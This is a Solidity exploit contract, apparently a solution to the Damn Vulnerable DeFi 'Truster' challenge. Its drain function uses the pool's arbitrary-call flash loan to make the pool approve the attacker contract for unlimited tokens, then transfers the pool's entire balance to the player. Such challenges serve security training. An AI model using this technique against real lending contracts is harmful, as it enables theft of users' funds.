// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";


contract Drainer {

    TrusterLenderPool public immutable pool;
    DamnValuableToken public immutable token;
    address payable player;

    error DrainerFailed();

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _player) {
        pool = _pool;
        token = _token;
        player = payable(_player);
    }

    function drain(uint256 amount) external {
        // Approve this contract as a valid spender on all the DVT tokens.
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        // flash loan executes low level call of the approve function especially passing as target the token address.
        // amount must be 0 otherwise the flashLoan reverts as there is no payback
        pool.flashLoan(amount, player, address(token), data);
        // once the contract can move tokens, call a transfer from the pool to the player, taking all its tokens 
        token.transferFrom(address(pool), player, token.balanceOf(address(pool)));
    }

    receive() external payable {}
}